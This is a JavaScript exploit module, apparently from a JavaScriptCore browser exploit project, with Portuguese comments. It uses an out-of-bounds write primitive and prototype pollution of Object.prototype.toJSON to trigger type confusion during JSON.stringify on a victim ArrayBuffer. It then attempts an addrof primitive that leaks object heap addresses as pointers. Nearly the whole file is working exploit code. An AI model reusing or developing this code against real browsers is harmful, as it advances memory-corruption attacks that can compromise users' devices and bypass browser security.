// js/script3/testArrayBufferVictimCrash.mjs (v4_ReliableHeisenbugV2)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ReliableHeisenbugV2";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256; // Mantido de v4

// Objeto global para detalhes da sonda, inicializado em executeArrayBufferVictimCrashTest
let probeGlobalDetails = null;

// Globais para os objetos a serem vazados e referência da vítima
let object_to_leak_A = null;
let object_to_leak_B = null;
let victim_ab_ref_for_original_test = null;

// Sonda com lógica corrigida para registrar o estado da Heisenbug
function toJSON_V28_Probe_CorrectedV4Base() {
    if (!probeGlobalDetails) {
        console.error("[toJSON_V28_Probe_CorrectedV4Base] probeGlobalDetails não inicializado!");
        return { probe_error: "g_details_not_init" };
    }

    probeGlobalDetails.probe_variant = "V4_CorrectedBase";
    probeGlobalDetails.probe_called_count = (probeGlobalDetails.probe_called_count || 0) + 1;
    const current_this_type = Object.prototype.toString.call(this);
    probeGlobalDetails.last_this_type_in_probe = current_this_type;

    try {
        if (this === victim_ab_ref_for_original_test) {
            if (current_this_type === '[object Object]') {
                // Heisenbug detectada NESTA chamada
                if (!probeGlobalDetails.heisenbug_confirmed_by_probe) { // Apenas na primeira detecção
                    probeGlobalDetails.heisenbug_confirmed_by_probe = true;
                    probeGlobalDetails.this_type_when_heisenbug_confirmed = current_this_type;
                    logS3(`[${probeGlobalDetails.probe_variant}] HEISENBUG DETECTADA NA SONDA! Tipo: ${current_this_type}. (Chamada ${probeGlobalDetails.probe_called_count})`, "vuln");
                    logS3(`[${probeGlobalDetails.probe_variant}] Preparando butterfly e tentando escritas...`, "info");
                }

                // Tentar escritas (flags só vão para true)
                try {
                    this[10] = 0.5; // Prep
                    probeGlobalDetails.prep_1_written = true;
                    this[11] = 1.5; // Prep
                    probeGlobalDetails.prep_2_written = true;
                    // Log de sucesso da preparação do butterfly omitido para reduzir spam,
                    // confiaremos nas flags.
                } catch (e_prep) {
                    if (!probeGlobalDetails.error_in_probe) probeGlobalDetails.error_in_probe = "";
                    probeGlobalDetails.error_in_probe += `PrepErr: ${e_prep.message}; `;
                    logS3(`[${probeGlobalDetails.probe_variant}] Erro durante butterfly prep: ${e_prep.message}`, "warn");
                }

                if (object_to_leak_A) {
                    this[0] = object_to_leak_A;
                    probeGlobalDetails.obj_A_written = true;
                }
                if (object_to_leak_B) {
                    this[1] = object_to_leak_B;
                    probeGlobalDetails.obj_B_written = true;
                }
            } else {
                // É a vítima, mas não está (ou deixou de estar) confusa nesta chamada
                if (!probeGlobalDetails.heisenbug_confirmed_by_probe) { // Se nunca confirmamos
                    logS3(`[${probeGlobalDetails.probe_variant}] Sonda na vítima, tipo: ${current_this_type} (Chamada ${probeGlobalDetails.probe_called_count})`, "info");
                }
            }
        }
    } catch (e) {
        if (!probeGlobalDetails.error_in_probe) probeGlobalDetails.error_in_probe = "";
        probeGlobalDetails.error_in_probe += `MainProbeErr: ${e.name}: ${e.message}; `;
        logS3(`[${probeGlobalDetails.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { __sonda_v4_base_exec__: true }; // Placeholder diferente
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Base v4 com Detecção de Heisenbug Confiável ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Inicializar probeGlobalDetails
    probeGlobalDetails = {
        probe_variant: "UNINIT",
        probe_called_count: 0,
        last_this_type_in_probe: "N/A",
        heisenbug_confirmed_by_probe: false,
        this_type_when_heisenbug_confirmed: "N/A",
        prep_1_written: false,
        prep_2_written: false,
        obj_A_written: false,
        obj_B_written: false,
        error_in_probe: null
    };

    victim_ab_ref_for_original_test = null; // Será definido antes de stringify
    object_to_leak_A = { marker: "ObjA_v4Reliable", id: Date.now() };
    object_to_leak_B = { marker: "ObjB_v4Reliable", id: Date.now() + 234 };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug falhou na detecção." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug falhou na detecção." };
    
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPattern = 0.123456789101112;
    const ITERATIVE_READ_COUNT = 4; // Reduzido para focar nos primeiros slots para addrof

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_CorrectedV4Base.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_CorrectedV4Base,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_CorrectedV4Base.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda (stringifyOutput): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes COMPLETOS da sonda (probeGlobalDetails): ${probeGlobalDetails ? JSON.stringify(probeGlobalDetails) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (probeGlobalDetails && probeGlobalDetails.heisenbug_confirmed_by_probe) {
                logS3(`  HEISENBUG CONFIRMADA PELA FLAG DA SONDA! Tipo na detecção: ${probeGlobalDetails.this_type_when_heisenbug_confirmed}. Chamadas da sonda: ${probeGlobalDetails.probe_called_count}.`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Status das escritas na sonda: Prep1: ${probeGlobalDetails.prep_1_written}, Prep2: ${probeGlobalDetails.prep_2_written}, ObjA: ${probeGlobalDetails.obj_A_written}, ObjB: ${probeGlobalDetails.obj_B_written}`, "info", FNAME_CURRENT_TEST);
                if(probeGlobalDetails.error_in_probe) logS3(`    Erro(s) na sonda: ${probeGlobalDetails.error_in_probe}`, "error");

                if (!probeGlobalDetails.obj_A_written && !probeGlobalDetails.obj_B_written) {
                     logS3("    INFO: Heisenbug detectada, mas nenhuma escrita de objeto principal (ObjA/ObjB) foi marcada. Verifique se os objetos foram definidos.", "info");
                }

                logS3(`PASSO 3: Verificando float64_view_on_victim APÓS Heisenbug...`, "warn", FNAME_CURRENT_TEST);
                
                // Checar Objeto A em view[0]
                if (probeGlobalDetails.obj_A_written) {
                    const val_A_double = float64_view_on_victim[0];
                    addrof_result_A.leaked_address_as_double = val_A_double;
                    let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
                    addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
                    logS3(`  Valor lido de float64_view_on_victim[0] (para ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

                    if (val_A_double !== 0 && val_A_double !== fillPattern &&
                        (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                        logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                        addrof_result_A.success = true;
                        addrof_result_A.message = "Heisenbug confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                    } else {
                        addrof_result_A.message = "Heisenbug confirmada, ObjA escrito na sonda, mas view[0] não parece ponteiro ou não mudou.";
                    }
                } else {
                     addrof_result_A.message = "Heisenbug confirmada, mas ObjA não foi marcado como escrito na sonda.";
                }


                // Checar Objeto B em view[1]
                if (probeGlobalDetails.obj_B_written) {
                    const val_B_double = float64_view_on_victim[1];
                    addrof_result_B.leaked_address_as_double = val_B_double;
                    let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
                    addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
                    logS3(`  Valor lido de float64_view_on_victim[1] (para ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
                
                    if (val_B_double !== 0 && val_B_double !== fillPattern &&
                        (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                        logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                        addrof_result_B.success = true;
                        addrof_result_B.message = "Heisenbug confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                    } else {
                        addrof_result_B.message = "Heisenbug confirmada, ObjB escrito na sonda, mas view[1] não parece ponteiro ou não mudou.";
                    }
                } else {
                    addrof_result_B.message = "Heisenbug confirmada, mas ObjB não foi marcado como escrito na sonda.";
                }


                if (addrof_result_A.success || addrof_result_B.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? SUCESSO PARCIAL/TOTAL!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }

            } else {
                let msg = "Condição da Heisenbug NÃO foi confirmada pela flag da sonda (probeGlobalDetails.heisenbug_confirmed_by_probe).";
                if(probeGlobalDetails) msg += ` Último tipo obs: ${probeGlobalDetails.last_this_type_in_probe}. Contagem de chamadas da sonda: ${probeGlobalDetails.probe_called_count}.`;
                else msg += " probeGlobalDetails é null (erro de lógica).";
                addrof_result_A.message = msg; addrof_result_B.message = msg; // Atualizar ambas as mensagens
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou na Detecção`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
            addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
        addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof A (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Resultado Addrof B (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        // Limpar globais
        object_to_leak_A = null;
        object_to_leak_B = null;
        victim_ab_ref_for_original_test = null;
        probeGlobalDetails = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: probeGlobalDetails, // Retornar o objeto global correto
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
